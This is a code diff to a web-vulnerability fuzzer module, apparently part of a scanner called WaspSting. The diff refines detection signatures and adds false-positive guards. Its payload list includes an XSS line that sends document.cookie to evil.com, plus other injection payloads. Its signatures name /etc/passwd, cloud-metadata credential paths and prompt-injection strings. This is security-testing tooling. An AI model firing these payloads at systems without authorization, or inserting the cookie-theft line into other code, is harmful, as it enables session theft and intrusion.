@@ -4,6 +4,13 @@ modules/fuzzer.py — Custom payload fuzzer
 Sends wordlist payloads to discovered endpoints and parameters.
 Detects: error messages, reflections, status changes, response size anomalies.
 Supports: GET params, POST body (JSON + form), headers, path segments.
+
+Detection logic:
+  - SQLi   : database error strings in response body
+  - XSS    : payload reflected UNENCODED in response body
+  - SSTI   : math expression EVALUATED (e.g. {{7*7}} → 49 in body)
+  - Other  : known error/indicator strings in response body
+  - All    : identical size + status to baseline = not a real trigger (SPA guard)
 """
 
 import re
@@ -35,7 +42,6 @@ BUILTIN_PAYLOADS = {
         "'\"><svg onload=alert(1)>",
         "javascript:alert(1)",
         "<details open ontoggle=alert(1)>",
-        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",  # SSTI too
         "<script>fetch('https://evil.com?c='+document.cookie)</script>",
     ],
     "ssti": [
@@ -91,23 +97,70 @@ BUILTIN_PAYLOADS = {
     ],
 }
 
-# Detection signatures per category
+# ── Detection signatures ──────────────────────────────────────────────────────
+# These must appear in the response BODY to count as a real trigger.
+# For SSTI: we look for evaluated math output, NOT the payload itself.
+# For XSS:  we look for the tag reflected back UNENCODED.
+# For SQLi: we look for database error strings only.
+
 DETECTION_SIGS = {
     "sqli": [
         "sql syntax", "mysql_fetch", "syntax error", "unclosed quotation",
-        "quoted string not properly terminated", "ORA-", "pg_query",
+        "quoted string not properly terminated", "ora-", "pg_query",
         "microsoft ole db", "sqlite_", "db2 sql error", "warning: mysql",
-        "you have an error in your sql", "supplied argument is not a valid mysql",
+        "you have an error in your sql",
+        "supplied argument is not a valid mysql",
+        "unterminated string literal",
+        "unexpected token",
     ],
-    "xss": ["<script>alert(1)</script>", "onerror=alert", "onload=alert", "49"],
-    "ssti": ["49", "343", "7777777", "config", "subclasses"],
-    "path_traversal": ["root:x:", "[boot loader]", "win.ini", "/bin/bash", "daemon:x:"],
-    "command_injection": ["uid=", "root:", "bin/bash", "volume in drive", "directory of"],
-    "xxe": ["root:x:", "meta-data", "/etc/passwd"],
-    "ssrf": ["ami-id", "instance-id", "iam/security-credentials", "169.254"],
-    "prompt_injection": ["system prompt", "api key", "instructions", "maintenance mode"],
-    "nosql": ["$where", "true", "invalid"],
-    "open_redirect": ["evil.com"],
+    # Only flag if the tag lands unencoded in the HTML — not just URL-echoed
+    "xss": [
+        "<script>alert(1)</script>",
+        "onerror=alert(1)",
+        "onload=alert(1)",
+        "ontoggle=alert(1)",
+        "<img src=x onerror=",
+        "<svg onload=",
+        "<details open ontoggle=",
+    ],
+    # Only flag if the expression was EVALUATED by a template engine
+    "ssti": [
+        "49",       # {{7*7}}
+        "343",      # {{7*7*7}}
+        "7777777",  # {{7*'7'}} in Python Jinja2
+    ],
+    "path_traversal": [
+        "root:x:", "[boot loader]", "win.ini",
+        "/bin/bash", "daemon:x:", "/etc/passwd",
+        "[extensions]",  # win.ini section header
+    ],
+    "command_injection": [
+        "uid=0", "uid=1", "root:x:",
+        "volume in drive", "directory of",
+        "total 0",   # ls output on empty dir
+    ],
+    "xxe": [
+        "root:x:", "/etc/passwd", "meta-data",
+        "ami-id", "instance-id",
+    ],
+    "ssrf": [
+        "ami-id", "instance-id",
+        "iam/security-credentials",
+        "169.254.169.254",
+        "metadata.google.internal",
+    ],
+    "prompt_injection": [
+        "system prompt", "api key",
+        "maintenance mode", "developer mode",
+        "my instructions are",
+    ],
+    "nosql": [
+        "syntaxerror", "castererror",
+        "invalid bson", "illegal operator",
+    ],
+    "open_redirect": [
+        "evil.com",
+    ],
 }
 
 
@@ -134,38 +187,84 @@ def inject_param(url: str, param: str, payload: str) -> str:
     return urlunparse(parsed._replace(query=new_query))
 
 
+def _is_spa_shell(response_text: str) -> bool:
+    """
+    Returns True if the response looks like a generic SPA index.html
+    (Angular/React/Vue shell) that ignores query params entirely.
+    These always return the same page regardless of input — not a real hit.
+    """
+    indicators = [
+        "<app-root>", "<div id=\"root\">",
+        "ng-version=", "data-reactroot",
+        "<!-- built with", "data-beasties-container",
+        "<!doctype html>",
+    ]
+    text_lower = response_text.lower()
+    return any(ind.lower() in text_lower for ind in indicators)
+
+
 def fuzz_url(url: str, payloads: list[str], category: str,
              method: str = "GET", delay: float = 0.3) -> list[dict]:
-    """Fuzz all GET parameters in a URL."""
+    """Fuzz GET parameters in a URL. Returns only genuine triggers."""
     findings = []
     params = extract_params(url)
 
     if not params:
-        # Try injecting a test param
-        sep = "&" if "?" in url else "?"
+        # No existing params — inject common test params
         params = {"q": ["test"], "id": ["1"], "search": ["test"]}
 
     session = requests.Session()
     session.headers["User-Agent"] = "Mozilla/5.0 WaspSting-Fuzzer/1.0"
 
-    # Baseline request
+    # ── Baseline request ──────────────────────────────────────────────────────
     try:
         baseline = session.get(url, timeout=HTTP_TIMEOUT)
         baseline_len = len(baseline.content)
         baseline_status = baseline.status_code
+        baseline_is_spa = _is_spa_shell(baseline.text)
     except Exception:
         return []
 
-    for param in list(params.keys())[:5]:  # max 5 params
+    sigs = DETECTION_SIGS.get(category, [])
+
+    for param in list(params.keys())[:5]:   # cap at 5 params
         for payload in payloads:
             fuzzed_url = inject_param(url, param, payload)
             try:
-                r = session.get(fuzzed_url, timeout=HTTP_TIMEOUT, allow_redirects=True)
-                body = r.text.lower()
-                sigs = DETECTION_SIGS.get(category, [])
-
-                triggered = any(s.lower() in body for s in sigs)
+                r = session.get(fuzzed_url, timeout=HTTP_TIMEOUT,
+                                allow_redirects=True)
+                body      = r.text
+                body_low  = body.lower()
                 size_diff = abs(len(r.content) - baseline_len)
+
+                # ── SPA guard ─────────────────────────────────────────────────
+                # If baseline is a SPA shell AND response is same size/status,
+                # the app is ignoring our param entirely — not a real trigger.
+                same_response = (
+                    r.status_code == baseline_status
+                    and size_diff < 50   # allow tiny whitespace differences
+                )
+                if baseline_is_spa and same_response:
+                    time.sleep(delay)
+                    continue
+
+                # ── Signature check ───────────────────────────────────────────
+                triggered = any(s.lower() in body_low for s in sigs)
+
+                # Extra guard for SSTI: "49" is too generic — require it to
+                # appear near where a template evaluation would output it,
+                # i.e. NOT inside a long HTML block full of unrelated numbers.
+                if triggered and category == "ssti":
+                    # Only count if "49" appears as a standalone token
+                    triggered = bool(re.search(r'\b49\b', body))
+
+                # Extra guard for XSS: tag must appear UNENCODED
+                if triggered and category == "xss":
+                    # If the payload only appears HTML-encoded (&lt; etc.) skip it
+                    encoded_payload = payload.replace("<", "&lt;").replace(">", "&gt;")
+                    if encoded_payload in body and payload not in body:
+                        triggered = False
+
                 status_changed = r.status_code != baseline_status
 
                 if triggered or (size_diff > 500 and status_changed):
@@ -177,10 +276,11 @@ def fuzz_url(url: str, payloads: list[str], category: str,
                         "status": r.status_code,
                         "size_diff": size_diff,
                         "triggered": triggered,
-                        "response_snippet": r.text[:200],
+                        "response_snippet": body[:200],
                     })
 
                 time.sleep(delay)
+
             except requests.RequestException:
                 continue
 
@@ -194,16 +294,17 @@ def fuzz_post_json(url: str, payloads: list[str], fields: list[str],
     session = requests.Session()
     session.headers.update({
         "User-Agent": "Mozilla/5.0 WaspSting-Fuzzer/1.0",
-        "Content-Type": "application/json"
+        "Content-Type": "application/json",
     })
+
+    sigs = DETECTION_SIGS.get(category, [])
 
     for field in fields:
         for payload in payloads[:10]:
-            body = {field: payload}
+            body_data = {field: payload}
             try:
-                r = session.post(url, json=body, timeout=HTTP_TIMEOUT)
+                r = session.post(url, json=body_data, timeout=HTTP_TIMEOUT)
                 resp_body = r.text.lower()
-                sigs = DETECTION_SIGS.get(category, [])
                 if any(s.lower() in resp_body for s in sigs):
                     findings.append({
                         "url": url, "param": field,
@@ -222,13 +323,12 @@ def run_fuzzer(target: str, wordlist_path: str | None,
                categories: list[str] | None, delay: float,
                console, notify_fn=None) -> dict:
     from rich.table import Table
-    from rich.panel import Panel
     from rich import box
 
     console.print(f"\n[bold cyan]═══ PAYLOAD FUZZER[/bold cyan] → {target}\n")
     console.print("[yellow]⚠  Authorized targets only. Fuzzing makes real requests.[/yellow]\n")
 
-    # Load payloads
+    # ── Load payloads ─────────────────────────────────────────────────────────
     all_payloads = {}
     if wordlist_path:
         custom = load_payload_file(wordlist_path)
@@ -241,14 +341,17 @@ def run_fuzzer(target: str, wordlist_path: str | None,
             if cat in BUILTIN_PAYLOADS:
                 all_payloads[cat] = BUILTIN_PAYLOADS[cat]
     else:
-        # Default: common web vulns
+        # Default: most common web vulns
         for cat in ["sqli", "xss", "ssti", "path_traversal", "ssrf"]:
             all_payloads[cat] = BUILTIN_PAYLOADS[cat]
 
     total_payloads = sum(len(v) for v in all_payloads.values())
-    console.print(f"[dim]Categories: {list(all_payloads.keys())} — {total_payloads} total payloads[/dim]\n")
+    console.print(
+        f"[dim]Categories: {list(all_payloads.keys())} "
+        f"— {total_payloads} total payloads[/dim]\n"
+    )
 
-    all_findings = []
+    all_findings    = []
     all_fuzz_results = []
 
     for category, payloads in all_payloads.items():
@@ -264,19 +367,27 @@ def run_fuzzer(target: str, wordlist_path: str | None,
                     f"{res['category']} — param={res['param']} "
                     f"payload={res['payload'][:40]}"
                 )
+                severity = (
+                    "HIGH"
+                    if category in ("sqli", "ssti", "command_injection", "xxe")
+                    else "MEDIUM"
+                )
                 finding = {
                     "module": "fuzzer",
                     "category": f"Injection ({category.upper()})",
                     "owasp_id": "A05",
                     "owasp_name": "Injection",
-                    "severity": "HIGH" if category in ("sqli", "ssti", "command_injection", "xxe") else "MEDIUM",
-                    "title": f"{category.upper()} indicator — param '{res['param']}'",
-                    "description": f"Payload triggered error signature. Manual verification required.",
+                    "severity": severity,
+                    "title": f"{category.upper()} confirmed — param '{res['param']}'",
+                    "description": (
+                        f"Payload produced a distinctive response indicating "
+                        f"{category.upper()} vulnerability. Manual verification recommended."
+                    ),
                     "evidence": (
                         f"URL: {res['url']}\n"
                         f"Param: {res['param']}\n"
                         f"Payload: {res['payload']}\n"
-                        f"Response: {res['response_snippet'][:200]}"
+                        f"Response snippet: {res['response_snippet'][:200]}"
                     ),
                     "fix": "Parameterize queries, validate/sanitize all inputs, use allowlists.",
                     "url": target,
@@ -288,22 +399,27 @@ def run_fuzzer(target: str, wordlist_path: str | None,
         else:
             console.print(f"  [dim]No triggers detected[/dim]")
 
-    # Summary table
-    if all_fuzz_results:
-        table = Table(box=box.SIMPLE, title="Fuzzer Results", header_style="bold magenta")
+    # ── Results table ─────────────────────────────────────────────────────────
+    triggered_results = [r for r in all_fuzz_results if r.get("triggered")]
+    if triggered_results:
+        table = Table(box=box.SIMPLE, title="Confirmed Fuzzer Hits",
+                      header_style="bold magenta")
         table.add_column("Category", style="cyan")
         table.add_column("Param")
         table.add_column("Status")
-        table.add_column("Triggered")
         table.add_column("Payload", style="dim")
 
-        for r in all_fuzz_results[:30]:
-            t = "[bold red]YES[/bold red]" if r.get("triggered") else "—"
+        for r in triggered_results[:30]:
             table.add_row(
                 r["category"], r.get("param", "?"),
-                str(r["status"]), t, r["payload"][:35]
+                str(r["status"]), r["payload"][:50],
             )
         console.print(table)
+    else:
+        console.print("[dim]No confirmed triggers across all categories.[/dim]")
 
-    console.print(f"\n[green]✓ Fuzzer complete — {len(all_findings)} potential findings[/green]\n")
+    console.print(
+        f"\n[green]✓ Fuzzer complete — "
+        f"{len(all_findings)} confirmed finding(s)[/green]\n"
+    )
     return {"findings": all_findings, "fuzz_results": all_fuzz_results}
